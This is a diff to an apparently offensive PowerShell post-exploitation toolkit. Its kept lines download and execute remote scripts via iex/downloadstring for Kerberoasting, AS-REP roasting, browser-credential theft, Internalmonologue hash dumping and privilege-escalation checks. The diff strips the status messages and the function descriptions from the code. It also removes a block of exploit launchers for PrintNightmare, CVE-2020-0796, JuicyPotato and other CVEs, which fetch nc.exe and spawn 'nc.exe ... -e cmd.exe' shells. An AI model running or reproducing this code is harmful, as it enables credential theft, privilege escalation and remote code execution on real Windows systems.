@@ -1,9 +1,8 @@
 
-            Write-Host -ForegroundColor Yellow 'Executing Seatbelt.'
+   
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); 
             if(!$consoleoutput){Invoke-Seatbelt -Command "-group=all=full" -outfile="C:\sh_adm_mtrx\seatbelt\seatbelt.txt" >> "C:\sh_adm_mtrx\seatbelt\seatbelt.txt"}else{Invoke-Seatbelt -Command "-group=all=full" -outfile="C:\sh_adm_mtrx\seatbelt\seatbelt.txt" }
-           
-            Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting.'
+ 
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPackerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
             if(!$consoleoutput){
                 Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap /outfile:C:\sh_adm_mtrx\Kerbero\ASreproasting.txt" 
@@ -16,7 +15,6 @@
                 Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
             }
 
-            Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson.'
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
             if(!$consoleoutput){
                 Invoke-watson >> C:\sh_adm_mtrx\Privilege_Escalation_Vulns.txt
@@ -26,7 +24,7 @@
             {
                 Invoke-watson
             }
-            Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb.'
+           
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
             if(!$consoleoutput){
                 Invoke-Sharpweb -command "all" >> C:\sh_adm_mtrx\Browsercredentials.txt
@@ -35,7 +33,7 @@
             {
                 Invoke-Sharpweb -command "all"
             }
-            Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns.'
+            
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
             if (isadmin)
             {
@@ -48,7 +46,7 @@
 
             if (isadmin)
             {
-                Write-Host -ForegroundColor Yellow 'Running Internalmonologue.'
+                
                 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
                 if(!$consoleoutput){
                     Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> C:\sh_adm_mtrx\Internalmonologue.txt
@@ -61,9 +59,7 @@
              }
              else
              {
-                Write-Host -Foregroundcolor Yellow "Run as admin."
-             }
-            
+
             return
         }
         
@@ -79,11 +75,6 @@ function isadmin
 
 function SessionGopher 
 {
-    <#
-    .DESCRIPTION
-        Starts slightly obfuscated SessionGopher to search for Cached Credentials.
-        
-    #>
      param(
         [switch]
         $noninteractive,
@@ -140,11 +131,6 @@ function SessionGopher
 
 function Kittielocal 
 {
-    <#
-    .DESCRIPTION
-        Dumps Credentials from Memory / Registry / SAM Database / Browsers / Files / DPAPI.
-        
-    #>
     param(
         [switch]
         $noninteractive,
@@ -230,176 +216,7 @@ function testtemp
  }
 }
 
-function PrintNightmare
-{
-    $DriverName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
-    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-PrintNightmare.ps1')
-    Invoke-Nightmare -DriverName $DriverName
-}
 
-function cve-2020-0796
-{
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0796-lpe.ps1')
-    cve-2020-0796-lpe
-}
-
-function cve-2020-0787-lpe
-{
-	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0787.ps1')
-	cve-2020-0787
-}
-
-function printspoofer
-{
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/printspoof_interactive.ps1')
-    printspoof
-}
-
-function CVE-2020-0683-lpe
-{
-    if ([Environment]::Is64BitProcess)
-    {
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0683.ps1')
-    	CVE-2020-0683
-    }
-    else
-    {
-        Write-Host "Only x64, Sorry"
-    }
-}
-
-function CVE-2019-1215
-{
-    testtemp
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
-    if ([Environment]::Is64BitProcess)
-    {
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2019-1215.ps1')
-    }
-    else
-    {
-        Write-Host "Only x64, Sorry"
-    }
-
-}
-
-function ms15-077
-{
-    testtemp
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
-    if ([Environment]::Is64BitProcess)
-    {
-        Write-Host "Only x86, Sorry"
-	Start-Sleep -Seconds 3
-    }
-    else
-    {
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/m15-077.ps1')
-	MS15-077 -command "C:\temp\nc.exe 127.0.0.1 4444"
-	Start-Sleep -Seconds 3
-	cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
-    }
-    
-
-}
-function Juicypot
-{
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    testtemp
-    Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
-    if ([Environment]::Is64BitProcess)
-    {
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/juicypotato64.ps1')
-        Invoke-JuicyPotato -Command "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
-    }
-    else
-    {
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/invoke-juicypotato.ps1')
-        Invoke-JuicyPotato -Command "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
-    }
-    Start-Sleep -Seconds 3
-    cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
-}
-
-function CVE-2018-8120
-{
-    testtemp
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2018-8120.ps1')
-    cve-2018-8120 -command "C:\temp\nc.exe 127.0.0.1 4444"
-    Start-Sleep -Seconds 3
-    cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
-}
-
-function CVE-2019-0841
-{
-    testtemp
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
-    Invoke-Sharpcradle -uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/privesc.exe" -argument1 license.rtf
-    Start-Sleep -Seconds 3
-    cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 2000}
-}
-function CVE-2019-1129
-{
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
-	Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
-	Start-Sleep -Seconds 15
-	Write-Host 'Next Try..'
-	Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
-	Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
-	Start-Sleep -Seconds 15
-}
-
-function CVE-2019-1069
-{
-	blocketw
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-    	$polaraction = Read-Host -Prompt 'Do you have a valid username and password for CVE-2019-1069?'
-	    if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
-	    {
-		    $username = Read-Host -Prompt 'Please enter the username'
-		    $password = Read-Host -Prompt 'Please enter the password'
-		    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-		    Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
-		    Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
-		    Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
-		
-		    if ([Environment]::Is64BitProcess)
-		    {
-			    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
-			    Start-Sleep -Seconds 1.5
-			    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
-		    }
-		    else
-		    {
-			    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
-			    Start-Sleep -Seconds 1.5
-			    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
-		    }
-		
-		    move env:USERPROFILE\Appdata\Local\temp\license.rtf C:\windows\system32\license.rtf
-		    del .\schedsvc.dll
-		    del .\schtasks.exe
-		    del C:\windows\system32\tasks\test
-	    }
-}
-
-function ms16-32
-{
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/ms16-32.ps1')
-    Invoke-MS16-032
-}
-
-function ms16-135
-{
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/ms16-135.ps1')
-}
 
 function Localreconmodules
 {
